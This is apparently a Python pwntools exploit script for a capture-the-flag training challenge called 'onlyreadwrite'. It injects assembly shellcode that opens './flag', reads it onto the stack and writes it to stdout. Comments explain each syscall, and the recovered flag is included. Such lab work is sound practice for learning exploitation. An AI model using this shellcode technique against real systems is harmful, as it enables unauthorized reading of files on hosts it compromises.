from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./onlyreadwrite")
		gdb.attach(p, """
		# b *play+601
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./onlyreadwrite"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2006)
else:
	p = process("./onlyreadwrite")

shellcode = pwnlib.shellcraft.amd64.linux.open('./flag', 0, 0)
shellcode += pwnlib.shellcraft.amd64.linux.read(3, 'rsp', 100)
shellcode += pwnlib.shellcraft.amd64.linux.write(1, 'rsp', 100)

shellcode = """
   mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f2e
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(3, 'rsp', 0x64) */
    push rax
    xor eax, eax /* SYS_read */
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n=0x64) */
    push 1
    pop rdi
    push 0x64
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall

"""

print(shellcode)

p.sendline(asm(shellcode))

p.interactive()

""" 
; push './flag' on the stack
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f2e
xor [rsp], rax

; call open(RDI -> './flag', 0, 0)
mov rdi, rsp
xor edx, edx /* 0 */
xor esi, esi /* 0 */
push SYS_open /* 2 */
pop rax /* -> 2 */
syscall

; call read(RDI -> RAX = fd of './flag', RSI = 'rsp', RDX = 0x64)
push rax
xor eax, eax /* SYS_read */
pop rdi ; -> fd  returned by open
push 0x64
pop rdx
mov rsi, rsp
syscall

; call write(fd=1 (stdout), RSI = 'rsp', RDX =0x64)
push 1
pop rdi
push 0x64
pop rdx
mov rsi, rsp
push SYS_write ; 1
pop rax
syscall


# Basically it is opening the file, reading it on the stack and then writing it on stdout. """

# Flag: flag{sometimes_you_do_not_need_a_shell_!}